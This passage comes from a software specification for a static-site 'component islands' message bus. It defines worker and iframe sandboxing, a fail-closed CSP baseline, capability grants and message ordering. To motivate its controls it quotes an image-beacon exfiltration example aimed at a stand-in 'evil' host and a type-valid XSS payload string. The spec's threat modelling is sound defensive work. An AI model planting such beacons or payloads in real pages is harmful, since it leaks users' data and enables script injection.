perturb pages that use neither. Bus residence/load-order is
[[SPEC-050-component-islands-and-messaging#12. Open Questions|Q4]], pinned in IMPL-050.

### REQ-5023: Session-Persistent Bus Under SPA Navigation
The [[SPEC-028]] SPA shell survives client-side navigation, and so does the single bus
instance ([[SPEC-050-component-islands-and-messaging#REQ-5007]]). The build-time "iff island"
gate (REQ-5012) therefore binds **emitted page assets**, not the live runtime, and the
runtime rule is stated separately to remove the apparent contradiction:
- A page that emits **no** island bootstrap SHALL NOT itself *create* the bus; but if an
  earlier page in the **same session** loaded an island, `window.zetl` already exists on the
  persistent shell and SHALL remain (REQ-5007 forbids a second instance, so it is neither torn
  down on nav to a no-island page nor re-created on the next island page).
- Consequently `window.zetl` presence at runtime is **"the session has ever loaded an island
  page,"** not "this page has an island." A no-island page that finds an ambient bus is
  acceptable: nothing on it references the bus, content islands remain sandboxed (REQ-5010), and
  no SPEC-048/049 surface gains ambient authority from the bus merely existing.
- **Persisted-topic live reflection** (REQ-5006) is available exactly when the bus is live —
  i.e. for any persisted topic in a session that has loaded ≥ 1 island page; a session that
  has loaded **only** no-island pages has just the per-page pre-paint script (load-time apply,
  no mid-session cross-tab reflection).

Full-page (non-SPA) loads collapse to the per-page model (REQ-5012). The build-time
determinism guarantee (TEST-5012) is about **emitted HTML**, which is unchanged by this REQ.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5023]], [[SPEC-050-component-islands-and-messaging#REQ-5004]], [[SPEC-050-component-islands-and-messaging#REQ-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5007]], [[SPEC-028]].

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5012]]; [[SPEC-050-component-islands-and-messaging#3.1 HP1]].

### REQ-5013: Typed Topic Payloads
Every topic SHALL declare a **value type** in its manifest
([[SPEC-050-component-islands-and-messaging#CON-5002]],
[[SPEC-050-component-islands-and-messaging#CON-5005]]), and every payload SHALL be recognised
against that type — by the **single shared recogniser** of CON-5005, fed a value normalised
to the input site's shape — before it is stored, replayed, or delivered. The recognition has
**two distinct standings**, which the spec does not conflate:
- At the **two trust boundaries** — the persisted-`localStorage` read path
  ([[SPEC-050-component-islands-and-messaging#REQ-5006]],
  [[SPEC-050-component-islands-and-messaging#CON-5004]]) and the **capability bridge**
  ([[SPEC-050-component-islands-and-messaging#REQ-5016]],
  [[SPEC-050-component-islands-and-messaging#CON-5006]]) — recognition is a **security
  control** (untrusted input): a non-conforming value is refused fail-closed
  (`island-payload-type`), defaulted on a persisted read, never delivered.
- At **in-realm `store.set`/`bus.emit`** (trusted theme code —
  [[SPEC-050-component-islands-and-messaging#Threat L]]) recognition is a **robustness /
  wiring check**, not a boundary: it catches typos and incompatible co-publishers, but
  provides no guarantee against malicious first-party code (which can publish a conforming-
  but-hostile value). The "no subscriber ever receives an *unrecognised* value" guarantee is
  total; the "no subscriber receives a *malicious* value" guarantee holds only for content
  islands behind the bridge.

Two publishers declaring **incompatible** types for the same topic SHALL be a build error
(`island-topic-type-conflict`). **Type-conflict detection compares ALL declarations of a topic —
publishers AND subscribers, not only publishers (normative, as implemented):** a publisher/
subscriber type mismatch is equally fatal (`island-topic-type-conflict`). This is required for
soundness because the runtime registers `data-island-types` from **every mounted island**, and a
last-writer-wins registration would otherwise make payload validation **hydration-order-dependent**
— so every declaration of a topic, whatever its direction, MUST agree on the type at build time.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5013]], [[SPEC-050-component-islands-and-messaging#CON-5005]], [[SPEC-050-component-islands-and-messaging#CON-5006]]; [[SPEC-050-component-islands-and-messaging#Threat C]], [[SPEC-050-component-islands-and-messaging#Threat H]].

### REQ-5025: Controlled-Element Content Islands (Default Mode)
A content-author island's **default** render mode SHALL run its code in a **dedicated Web
Worker** (NOT a `SharedWorker`; the worker MUST NOT be handed transferred ports as alternate
inbound channels, so the "messages are unambiguously this worker's" identity claim of CON-5006
holds) and SHALL render UI **only** by emitting a **declarative element tree** (`render` message,
[[SPEC-050-component-islands-and-messaging#CON-5006]]) that the **trusted host** paints, after
the [[Shopify Remote DOM]] / [[worker-dom]] model. **Threat M is closed by construction ONLY
relative to the normative renderer contract** [[SPEC-050-component-islands-and-messaging#CON-5007]]
(the element/attribute allowlist, per-attribute URL/value grammars, fail-closed defaults, and
the bounded cycle-aware recursive `tree` recogniser) — without CON-5007 the claim does not hold
(an undefined or fail-open allowlist re-admits XSS), so CON-5007 is **load-bearing**, not an
IMPL detail. A `render` requires a granted **`render` capability**
([[SPEC-050-component-islands-and-messaging#CON-5002]]); a headless (subscribe-only) island
without it cannot paint. A worker's code is untrusted and runs with the platform's **ambient
`fetch`/`importScripts`/WebSocket/storage** — "no DOM" is **not** "no egress" — so it SHALL be
confined per [[SPEC-050-component-islands-and-messaging#REQ-5026]] (CSP `worker-src`/
`connect-src`, integrity-pinned script, no unblessed `importScripts`); the `render` rate is
bounded there too. Identity is simple: the parent creates the `Worker`, holds the only
reference, `postMessage`s it directly, and keys the grant on that `Worker` object — no `"null"`
origin, no `event.source`, no bootstrap, no routing map (the REQ-5016 iframe bootstrap applies
only to the escape hatch). The static (no-JS) component HTML remains the parent-document
fallback ([[SPEC-050-component-islands-and-messaging#REQ-5002]]); the painted subtree carries
the worker-mode a11y contract ([[SPEC-050-component-islands-and-messaging#REQ-5020]]).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5025]], [[SPEC-050-component-islands-and-messaging#CON-5007]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#ADR-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5016]]; [[SPEC-050-component-islands-and-messaging#Threat M]], [[SPEC-050-component-islands-and-messaging#Threat N]].

### REQ-5026: Content-Worker Confinement (Egress, Integrity, Render Rate)
A content island's Worker (REQ-5025) is **untrusted code with ambient platform capabilities**;
ADR-5010's "stronger isolation" is true for DOM but **false for network and local storage**
unless confined. **The confinement mechanism is a host-document CSP, not a per-worker policy**
— a subtlety v0.11.0 got wrong: a Worker's CSP comes from *its own script response header* when
served over HTTP, and a `blob:`/same-origin worker **inherits the creating document's policy**;
there is **no "inline CSP" in worker source**, and static/`file://` output has no per-worker
response header. So a same-document Worker **cannot be given a network policy stricter than the
host document's**. Confinement therefore works as follows:
- **Egress is the host-document CSP, page-wide, theme/operator-owned.** The CSP is **declared,
  computed (fail-closed), and emitted per [[SPEC-050-component-islands-and-messaging#REQ-5027]]**
  — declared in site config `[security.csp]` (+ theme manifest), emitted as a `<meta http-equiv>`
  (authoritative on static/`file://`) and a served-headers artifact, with a default-deny baseline
  (`connect-src 'none'`, `worker-src 'self' blob:`, `img-src`/`media-src`/`font-src`/`style-src`
  `'self'`). The worker inherits it. **There is no per-island egress widening** (impossible
  without widening the whole page); any widening is a **trusted** `[security.csp]`/theme decision,
  surfaced in the audit graph (REQ-5009) — never a content-author manifest field.
- **The renderer is itself an egress surface (Threat N).** Even with the worker confined, a
  `render` tree can encode a granted value into an allowlisted remote URL
  (`<img src="https://evil/?d=…">`) that the **host document** fetches. Two controls, both
  required: (1) the host-document CSP above restricts `img-src`/`media-src`/etc.; (2) **CON-5007
  taint rule** — a content island that holds **any granted trusted-topic read** MAY emit only
  **same-origin/relative** URL attributes in its render tree (remote `src`/`srcset`/`href`/
  `poster` rejected), so a read-granted island cannot beacon the secret out through the renderer.
- **Integrity.** Subresource Integrity does **not** apply to `new Worker(url)`, so the build SHALL
  pin the worker script by a **content hash compared before instantiation** (load bytes → verify
  hash → instantiate from a `blob:` of the verified bytes); a mismatch fails closed.
- **Render rate.** Inbound `render`/`publish`/`emit` SHALL be **coalesced/rate-bounded** (≤ one
  paint per animation frame; excess coalesced; per-island budget breach → `denied:cap-exceeded`),
  symmetric with the REQ-5021 outbound debounce, so a worker loop cannot saturate the host
  **main-thread** reconciler ([[SPEC-050-component-islands-and-messaging#Threat D]]).
- **Honest residual.** The strong "a granted read stays local" guarantee **requires** the
  operator to ship the restrictive host-document CSP; on a `file://` deploy CSP enforcement is
  browser-dependent, so confinement there is **best-effort, not guaranteed** — the spec states
  this rather than implying an absolute guarantee. Local same-origin **storage** (IndexedDB/Cache)
  is *not* gated by CSP at all ([[SPEC-050-component-islands-and-messaging#REQ-5010]] residual).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#REQ-5027]], [[SPEC-050-component-islands-and-messaging#NFR-5002]]; [[SPEC-050-component-islands-and-messaging#Threat N]], [[SPEC-050-component-islands-and-messaging#Threat K]], [[SPEC-050-component-islands-and-messaging#Threat D]].

### REQ-5027: CSP Declaration, Computation & Emission (Where the Egress Policy Lives)
REQ-5026's confinement is a host-document CSP — but "the operator ships a CSP" is not
actionable until the **declaration site, computation, and emission** are defined. This REQ does
that, and makes the policy **fail-closed by default** so a forgetful operator cannot leave a
content island unconfined.

- **Declaration site (trusted).** Operator widenings are declared in **site config under a
  `[security.csp]` table**; theme-level needs (a trusted island that must reach a specific host)
  are declared in the **theme manifest** ([[SPEC-048]] CON-4801) and merged. Content-island
  manifests **cannot** declare CSP (REQ-5026 B2). Shape:
  ```
  [security.csp]                                  # site config — operator-owned
  connect-src = ["https://api.example.com"]       # widen document/worker network egress
  img-src     = ["https://cdn.example.com"]       # widen renderer image sources
  # worker-src / media-src / font-src / style-src likewise; values are host sources, never "*"
  ```
- **Computation (fail-closed union).** The build SHALL compute each page's effective CSP as a
  **default-deny baseline ∪ declared widenings**. For any page carrying a **content island**, the
  baseline SHALL be at least: `default-src 'none'`; `script-src 'self'` + the island/pre-paint
  **`'sha256-…'`** hashes (REQ-5018/5019); `worker-src 'self' blob:`; **`connect-src 'none'`**;
  `img-src 'self'`; `media-src 'self'`; `font-src 'self'`; `style-src 'self'`; `base-uri 'none'`;
  `form-action 'none'`. A `*` source SHALL be **rejected** at build (`csp-wildcard`); each
  widening SHALL be a finite host list. The absence of `[security.csp]` yields the baseline
  (**not** "no CSP") — this is the fail-closed default.
- **Emission.** The build SHALL emit the computed policy as a **`<meta http-equiv="Content-Security-Policy">`
  as the first `<head>` child** (before any island bootstrap, so it governs them; authoritative
  on static/`file://`), AND SHALL emit a **served-deploy headers artifact** (a `csp-headers`
  manifest the operator wires into their server/CDN) carrying the same policy plus the
  directives `<meta>` cannot set (`frame-ancestors`, `report-uri`). The two SHALL be byte-derived
  from the same computed policy (no drift).
- **Mandatory for content-island pages.** A page that emits a content island SHALL emit the CSP;
  the build SHALL NOT produce a content-island page with no policy. (Pages without islands MAY
  emit it; recommended.)
- **Audit.** The effective per-page CSP, and which `[security.csp]`/theme declaration widened
  each directive beyond baseline, SHALL appear in the wiring graph
  ([[SPEC-050-component-islands-and-messaging#REQ-5009]]/OBS-5001) so an operator can see — and a
  reviewer can diff — exactly what egress each page permits.

**Honest residual (unchanged):** `<meta>` CSP enforcement on `file://` is browser-dependent
(best-effort there); the served-headers artifact is authoritative when deployed behind a server.
Storage egress (IndexedDB/Cache) remains outside CSP (Q10).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5027]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#REQ-5009]], [[SPEC-048]]; [[SPEC-050-component-islands-and-messaging#Threat N]].

### REQ-5028: Author Capability Requests (Request → Approve → Audit)
The egress policy is operator-owned (REQ-5026/5027), but a **content-island author needs a way
to *express* what their island needs** — otherwise the operator must learn it out-of-band. This
REQ adds the author-side half, mirroring the existing topic flow (`subscribes` request →
`[[theme.island-grants]]` approve) and the browser-extension / [[MetaMask Snaps]] permission
pattern. **Requests are declarations of intent, never authority** — fail-closed.

- **Declaration site (untrusted author).** A content island MAY declare an `[island.requests]`
  table in its own manifest:
  ```
  [island.requests]                              # content-island manifest — REQUESTS, not grants
  connect-src = ["https://api.example.com"]      # hosts the island would like to reach
  bundles     = ["chart.js@4"]                   # libraries it vendors in (see "Libraries" below)
  reason      = "renders a live price chart"     # human rationale, shown to the operator
  ```
- **Inert until approved (fail-closed).** An `[island.requests]` entry confers **nothing** on its
  own. A requested `connect-src` host takes effect **only if** the operator independently lists it
  in `[security.csp]` (REQ-5027); an unapproved request is a **no-op** at runtime (the baseline
  `connect-src 'none'` still holds). The build SHALL NOT let a request widen any policy.
- **Surfaced for review.** The build SHALL list, per island in the audit graph (REQ-5009),
  every `[island.requests]` entry and its **approval status** (`approved` if a matching
  `[security.csp]`/grant exists, else `unapproved`), with the author's `reason`, so the operator
  sees exactly what each island asked for and can approve by editing `[security.csp]`. An
  `unapproved` request MAY be surfaced as an `island-request-unapproved` **info/warning** (never
  an error — the island still runs, just without the requested capability).
- **Libraries are bundled, not fetched.** A `bundles` entry documents a library the author
  **vendors into the island's own script at build time**; it becomes part of the
  integrity-pinned worker/script bytes (REQ-5019/5026). Runtime remote `importScripts`/`<script>`
  loading remains blocked by the page CSP — there is **no runtime CDN path**. `bundles` is thus
  documentation + an audit signal (what third-party code is inside the pinned bytes), not a
  fetch permission.
- **Honest enforcement-granularity caveat.** Approval is recorded per island, but **CSP
  enforcement is page-wide** — `connect-src` cannot be scoped to one worker (REQ-5026). So
  approving island A's host technically lets island B's worker reach it too. `[island.requests]`
  improves **governance and auditability**, NOT enforcement isolation; true per-island egress
  isolation requires separate origins (Q10). The spec states this rather than implying per-island
  enforcement.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5028]], [[SPEC-050-component-islands-and-messaging#REQ-5027]], [[SPEC-050-component-islands-and-messaging#REQ-5009]], [[SPEC-050-component-islands-and-messaging#REQ-5019]]; [[SPEC-050-component-islands-and-messaging#Threat N]].

### REQ-5029: Dynamic Updates via Host Reconciliation (No VDOM Framework)
A content island needs to **update its UI over time** (re-render on state change), but zetl
SHALL NOT ship a VDOM/reactivity **framework** (that would violate NFR-5002's no-framework-
runtime rule and the once-per-type model). The resolution, after [[Shopify Remote DOM]]: the
host ships a **tiny keyed reconciler** (the *only* diffing zetl provides — not a framework), and
islands drive updates by **re-emitting**:
- **Update model.** To change its UI, a worker re-emits a `render` (CON-5006) carrying the **new
  full element tree**. The host **reconciles** it against the currently-painted subtree with a
  **keyed diff**, applying the **minimal DOM mutations** (not a teardown + repaint), so **focus,
  text selection, scroll position, and uncontrolled input state are preserved** on nodes whose
  identity is stable across the update.
- **Keys for stable identity.** An element node MAY carry a stable **`key`** (string) — a
  reserved CON-5007 tree field, not a rendered attribute — used as its reconciliation identity;
  keyed siblings are matched by `key` across re-renders (move/update, not destroy+recreate),
  keyless siblings by position. This is what lets a list re-order or an input survive a re-render.
- **The framework, if any, lives in the worker.** An author MAY use any local VDOM/templating
  library (Preact, lit-html, etc.) **bundled** into their worker (REQ-5028 `bundles`) to *produce*
  the tree; it runs **off the main thread** and zetl never sees it. The wire protocol (`render` +
  the host reconcile) is framework-agnostic — the worker's choice of library is invisible to zetl
  and to other islands.
- **Bounded + coalesced.** Every update is still bounded by CON-5007 (depth/breadth/node/byte,
  cycle-rejecting) and **rate-coalesced** to ≤ one paint per frame (REQ-5026), so a worker that
  re-renders on every keystroke is naturally throttled and cannot saturate the main thread.
- **(v2, deferred — Q11.)** A finer **mutation/patch** protocol (`op:"patch"` carrying
  insert/remove/set-attr/set-text ops keyed by node path) would avoid re-sending a full tree for
  a large surface. v1 uses full-tree-re-render + keyed reconcile (simpler, one message shape, and
  adequate for the bounded trees CON-5007 permits); the patch protocol is `[Blocked: Q11]`.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5029]], [[SPEC-050-component-islands-and-messaging#REQ-5025]], [[SPEC-050-component-islands-and-messaging#CON-5007]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#NFR-5002]].

### REQ-5030: Message Ordering, Sequencing & Delivery Semantics
The bus SHALL define an explicit ordering + sequencing model so islands can reason about
delivery (and detect the drops that coalescing deliberately introduces).

- **Per-island FIFO.** Messages from a single island are processed in send order (the platform's
  per-channel `postMessage`/Worker in-order guarantee). The bus relies on this and SHALL NOT
  reorder a single island's messages.
- **Single host total order (linearizable, causality-preserving).** The bus runs on the host's
  single-threaded event loop and serializes **all** islands' messages into **one total order =
  arrival order**. Each message is processed **atomically** — recognise → apply to the store/bus
  → **synchronous** subscriber fan-out (REQ-5005) → only then the next message — so no subscriber
  observes half-applied state. Because the bus is the **sole** inter-island channel, this total
  order is consistent with causality by construction: an island cannot observe an effect before
  its cause (the cause passed through the same serializer first).
- **Host-assigned sequence (this is the "sequencing").** The host SHALL stamp each store
  mutation with a **strictly monotonic `seq`** (integer, per session, from 1) in that total
  order, and SHALL carry it on every delivered `update` and on the replay value at subscribe
  (CON-5006). Because the host is the single writer, `seq` is a true **total order**, not a
  partial one. Uses: (1) **drop detection** — a subscriber comparing successive `seq`s sees a
  **gap** exactly when REQ-5021/5026 coalesced intermediate changes, so it knows it skipped and
  by how much without seeing the skipped values; (2) **idempotency across replay/remount** —
  replay-on-subscribe (REQ-5005) and SPA remount (REQ-5017) re-deliver the current value, and
  `seq` lets an island recognise "already applied through N" and not double-apply; (3) a stable
  cursor for audit/debug. Each topic also exposes the `seq` of its **last change** (for per-topic
  staleness). An island MAY also stamp its **own** outbound messages with a local counter that
  the host echoes in `ack`, to correlate request→ack (debug aid, not load-bearing).
- **No cross-island ordering assumption.** The relative order of messages from *different*
  islands is just arrival order — nondeterministic; coordination MUST NOT depend on it. Use the
  retained store (last-value-wins) for state, never "island A published before island B."
- **Coalescing preserves order, drops content.** REQ-5021 (`update` value-change-only, debounced)
  and REQ-5026 (`render` ≤ one paint/frame) deliver a **monotonic subsequence** — intermediate
  messages dropped (visible as `seq` gaps), latest wins, **never reordered**.
- **Cross-tab is last-write-wins, not logically clocked.** Persisted-topic cross-tab reflection
  (REQ-5006) has multiple independent serializers (one host per tab); it resolves by **LWW** on
  `storage`-event arrival, which is adequate for UI-coordination state. A **Lamport/vector clock
  is deliberately NOT used** — it would only give a *partial* order weaker than the host's total
  order for the in-page case, and for the genuine multi-serializer (cross-tab) case it cannot
  *merge* concurrent writes (LWW already provides the consistent tiebreak; real merge would need
  a CRDT, out of scope for theme/UI state). `seq` is a single-writer sequence counter, **not** a
  distributed logical clock — recorded here so a future reader does not add one reflexively.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5030]], [[SPEC-050-component-islands-and-messaging#REQ-5005]], [[SPEC-050-component-islands-and-messaging#REQ-5021]], [[SPEC-050-component-islands-and-messaging#REQ-5026]], [[SPEC-050-component-islands-and-messaging#CON-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5006]].

### REQ-5015: Content-Island iframe Sandbox (Opt-In Full-DOM Mode)
A content-author island that opts into **full-DOM mode** ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
[[SPEC-050-component-islands-and-messaging#ADR-5010]] — because it needs arbitrary DOM or a
DOM-manipulating library) SHALL instead be mounted inside a `<iframe sandbox>` whose token set
includes `allow-scripts` and **excludes `allow-same-origin`**, giving the iframe an opaque
origin and a separate realm; the iframe SHALL NOT be granted `allow-top-navigation`,
`allow-popups`, `allow-modals`, or form/pointer-lock escalations beyond what the component
declares and the theme permits. The iframe document SHALL carry a restrictive
**Content-Security-Policy**; because zetl output is **static** (no per-request nonce is
possible), the island module SHALL be admitted by a build-computed **`'sha256-…'` hash**
source — never `'unsafe-inline'` — and remote origins SHALL be denied unless theme-declared.
The island's code, DOM, storage, and network SHALL be confined to the iframe; it SHALL
communicate with the page **only** through its capability-bridge port
([[SPEC-050-component-islands-and-messaging#REQ-5016]]). The iframe SHALL carry a `title`
(build-derived from the component name) for assistive technology, and the spec'd a11y
behaviour at the frame boundary is defined by
[[SPEC-050-component-islands-and-messaging#REQ-5020]]. The static (no-JS) rendering of the
component SHALL remain the parent-document HTML
([[SPEC-050-component-islands-and-messaging#REQ-5002]]); the iframe enhances, and its
absence (JS off / sandbox unsupported) SHALL leave the static content intact, usable, and
indexable ([[SPEC-002]]).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5015]], [[SPEC-050-component-islands-and-messaging#REQ-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5020]]; [[SPEC-050-component-islands-and-messaging#Threat A]], [[SPEC-050-component-islands-and-messaging#Threat I]], [[SPEC-050-component-islands-and-messaging#Threat J]].

### REQ-5016: Capability-Scoped Bridge (Transport-Agnostic Reference Monitor)
The shell SHALL connect a content island to the bus through a **capability-scoped bridge** in
which the **parent is the sole reference monitor**, holding a per-island **grant table** and,
on **every** inbound message, enforcing: (a) the message arrived from a **known island
handle** the parent created and holds (the discriminator differs by transport, below);
(b) `(topic, direction)` is in that island's grant table; (c) the payload conforms to the
topic's declared type ([[SPEC-050-component-islands-and-messaging#REQ-5013]],
[[SPEC-050-component-islands-and-messaging#CON-5006]]). A message failing any check SHALL be
answered `denied` with a reason and never reach the bus. The island SHALL NOT be able to
enumerate, widen, or forge grants — it holds only its end of the channel. Grants for trusted
topics SHALL be **subscribe-only** and require an explicit `[[theme.island-grants]]` entry
([[SPEC-050-component-islands-and-messaging#CON-5002]]); a publish grant for a non-`content:`
topic is unexpressible. Update relay is governed by
[[SPEC-050-component-islands-and-messaging#REQ-5021]]. An island `unsubscribe` SHALL **release the
underlying store subscription** (so the bridge stops receiving `update`s) **and free the island's
global subscriber-budget slot** (NFR-5002) — it MUST NOT merely clear debounce/last-delivered
state and leave the real subscription live (a leak), per
[[SPEC-050-component-islands-and-messaging#CON-5006]]. This holds identically for **both
render modes** ([[SPEC-050-component-islands-and-messaging#REQ-5010]]); only the **transport
and the island handle** differ:

- **Worker transport (DEFAULT — [[SPEC-050-component-islands-and-messaging#REQ-5025]]).** The
  parent calls `new Worker(url)` and holds the returned **`Worker` object** — that reference
  **is** the island handle (the grant is keyed `Map<Worker, Grant>`). The parent
  `worker.postMessage`s and listens on `worker.onmessage`; a `Worker`'s messages are
  unambiguously from that worker (no `origin`, no `source`, no other frame can post to it), so
  **there is no bootstrap ceremony, no `"null"`-origin problem, no `event.source` matching, no
  port transfer, and no routing map**. This is the simple, default path and the recommended
  model for content islands.
- **Iframe transport (OPT-IN escape hatch — [[SPEC-050-component-islands-and-messaging#REQ-5015]]).**
  When an island needs arbitrary DOM, the parent mounts a sandboxed iframe and must bridge across
  the opaque-origin boundary, where the simple `Worker` identity is unavailable. It therefore
  uses the **child-ready-first `MessageChannel` bootstrap**: the parent records
  `Map<WindowProxy, Island{iframe,port1,port2,grant}>` keyed by `iframe.contentWindow` *before*
  listening; the **child** posts `zetl:ready` over `window`; the parent's `window` handler
  routes **solely by `event.source` `WindowProxy` identity** (a hit transfers that island's
  `port2`; a miss is a no-op; `zetl:ready` payload is ignored for routing); after transfer the
  island handle is **`port1` object identity** (`WeakMap<port1, Island>`), never
  `origin`/`source` ([[SPEC-050-component-islands-and-messaging#Threat J]]). A missing
  `zetl:ready` within a bounded timeout → one retry → teardown (REQ-5017); (re)creations are
  bounded (NFR-5002). This is the heavier path that the four review passes hardened; it exists
  **only** for the escape hatch.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5016]], [[SPEC-050-component-islands-and-messaging#TEST-5025]], [[SPEC-050-component-islands-and-messaging#CON-5002]], [[SPEC-050-component-islands-and-messaging#CON-5006]], [[SPEC-050-component-islands-and-messaging#REQ-5013]], [[SPEC-050-component-islands-and-messaging#REQ-5017]], [[SPEC-050-component-islands-and-messaging#REQ-5021]], [[SPEC-050-component-islands-and-messaging#REQ-5025]]; [[SPEC-050-component-islands-and-messaging#Threat A]], [[SPEC-050-component-islands-and-messaging#Threat J]]; [[SPEC-050-component-islands-and-messaging#3.5 HP5]].

### REQ-5021: Subscribe-Relay Semantics (Value-Change-Only)
The bridge's outbound relay of a granted subscription to a content island SHALL deliver an
`update` **only on a distinct value change** (deduplicated against the last delivered value),
debounced to a security-relevant interval (`[Provisional]`, pinned in IMPL-050) — **not** a
per-event or per-animation-frame stream. This bounds both flooding and the timing side-channel
a high-frequency trusted publisher would otherwise expose to a granted reader. The spec
records honestly that a granted trusted-topic subscribe **is a full read** of that topic's
value plus a residual change-rate signal; it is a deliberate capability the theme grants
explicitly ([[SPEC-050-component-islands-and-messaging#CON-5002]]) and SHALL be surfaced in
the audit graph ([[SPEC-050-component-islands-and-messaging#OBS-5001]]). It does **not** claim
to eliminate the timing channel — only to coarsen it to value transitions.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5016]], [[SPEC-050-component-islands-and-messaging#OBS-5001]]; [[SPEC-050-component-islands-and-messaging#Threat K]].

### REQ-5022: Recognition Is Type-Safety, Not Output Safety
Type recognition ([[SPEC-050-component-islands-and-messaging#REQ-5013]],
[[SPEC-050-component-islands-and-messaging#CON-5005]]) validates a value's **structure/type
only** — it makes **no** claim about safety in an output context. A *conformant* value can
still be dangerous in a DOM/HTML/URL sink (e.g. a `string`-typed value `"<img src=x
onerror=…>"` is type-valid yet an XSS payload). Two obligations follow:

1. **Subscriber obligation.** A subscriber SHALL treat every delivered value as **untrusted
   text** for output: insert via `textContent` (never `innerHTML`/`insertAdjacentHTML`), and
   never use a `string`/`enum`-string/record-string value directly as a URL, `javascript:`/
   `data:` scheme, attribute name, or `<script>`/style content without context-appropriate
   re-validation. This holds even for in-realm topics, because an **untrusted content island**
   may be a publisher on any `content:` topic a trusted subscriber reads.
2. **Producer restriction (close the markdown-authored-XSS path by construction).** A
   **content island** (sandboxed, untrusted) SHALL NOT *publish* a topic whose declared type is
   free `string`, or a record containing a `string` field; its publishable (`content:`) topic
   types are restricted to `bool` / `int` / `number` / `enum(...)` (closed value sets). A
   manifest violating this is a build error (`island-content-value-type`,
   [[SPEC-050-component-islands-and-messaging#CON-5002]]). A content island MAY still
   *subscribe* a `string`-typed topic (it only reads). This means the one channel where an
   *untrusted author chooses the value* cannot carry free text, so a trusted subscriber cannot
   be fed attacker-authored markup through the sanctioned bridge — defense in depth atop
   obligation 1.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5022]], [[SPEC-050-component-islands-and-messaging#CON-5002]], [[SPEC-050-component-islands-and-messaging#REQ-5013]]; [[SPEC-050-component-islands-and-messaging#Threat H]], [[SPEC-050-component-islands-and-messaging#Threat M]].

### REQ-5017: Island Lifecycle Under SPA Navigation
The shell SHALL define a deterministic island lifecycle across [[SPEC-028]] client-side
navigation, since islands mount, unmount, and re-mount as page subtrees swap. On removal of an
island's subtree the shell SHALL, from the parent side: (a) **revoke the island's grant**
(delete its handle entry — `Map<Worker, Grant>` default, or `Map<WindowProxy>` +
`WeakMap<port1>` escape hatch), **cancel any pending debounced `update` relay timer**, and
**dispose its realm** — **`worker.terminate()`** in the default mode, or **close `port1` +
remove the `<iframe>`** in the escape hatch. The **load-bearing in-flight guard is the handle
miss, not channel closure**: closure only stops *future* delivery, so the inbound handler SHALL
look the island handle up **first** and treat a miss as a silent drop (`island-port-closed`),
covering a `message` already dispatched before disposal; likewise every outbound relay closure
SHALL re-check handle membership immediately before posting and skip a torn-down island, so a
debounced `update` firing after teardown is a no-op that never dereferences freed state. (In the
default mode `terminate()` is synchronous and decisive, so this guard is belt-and-braces; in the
escape hatch it is essential.) The shell SHALL also (b) **release its bus subscriptions** (the
`unsubscribe()` handles from [[SPEC-050-component-islands-and-messaging#CON-5003]]) so the
subscriber count does not grow across navigations toward the
[[SPEC-050-component-islands-and-messaging#NFR-5002]] cap (bridge-relayed subscriptions count
against the same cap and are released here). On re-mount the shell SHALL hydrate idempotently
([[SPEC-050-component-islands-and-messaging#REQ-5003]]) and issue a **fresh** Worker (or
iframe+`MessageChannel`) + grant (never reuse a prior handle). Retained store *values* persist
on the nav-surviving shell ([[SPEC-050-component-islands-and-messaging#REQ-5007]]); only
per-mount *subscriptions, workers/iframes, and channels* are torn down and rebuilt.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5017]], [[SPEC-050-component-islands-and-messaging#REQ-5003]], [[SPEC-050-component-islands-and-messaging#REQ-5016]]; [[SPEC-050-component-islands-and-messaging#Threat J]].

### REQ-5018: Persisted Pre-Paint Script (Static, Self-Contained, Fail-Safe)
The render-blocking pre-paint script for persisted topics
([[SPEC-050-component-islands-and-messaging#REQ-5006]],
[[SPEC-050-component-islands-and-messaging#ADR-5005]]) SHALL be a **build-time-generated
static** snippet (no runtime code generation) that runs before the bus module loads, so it
SHALL embed **its own** minimal recogniser for each persisted topic's declared type
([[SPEC-050-component-islands-and-messaging#CON-5005]]) rather than calling the not-yet-loaded
bus. It SHALL wrap all work in `try/catch`, applying the **declared default** on any
parse/type/exception path, and SHALL apply the value only as a pre-agreed DOM signal (e.g. an
attribute on the document root) — never by interpreting the stored string as code or markup.
For static output it SHALL be admitted by a build-computed **`'sha256-…'` CSP hash**, not
`'unsafe-inline'`. This is an explicit, acknowledged exception to
[[SPEC-050-component-islands-and-messaging#1.3 Design Principles|Principle 7]]: a page
declaring a persisted topic emits this one inline script even with no interactive island; a
page with **no** persisted topic and no island emits nothing
([[SPEC-050-component-islands-and-messaging#REQ-5012]]).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5018]], [[SPEC-050-component-islands-and-messaging#CON-5004]], [[SPEC-050-component-islands-and-messaging#CON-5005]]; [[SPEC-050-component-islands-and-messaging#Threat C]], [[SPEC-050-component-islands-and-messaging#Threat F]].

### REQ-5019: Trusted In-Realm Island Hardening
Because a trusted in-realm island has ambient authority over `window.zetl`, the shell SHALL
reduce blast radius: (a) it SHALL **deep-freeze** the `window.zetl` capability **before any
island script runs** — the object, its `store`/`bus` methods, and any exposed sub-objects are
non-writable/non-configurable, and internal topic/subscriber state is **closed over** (not
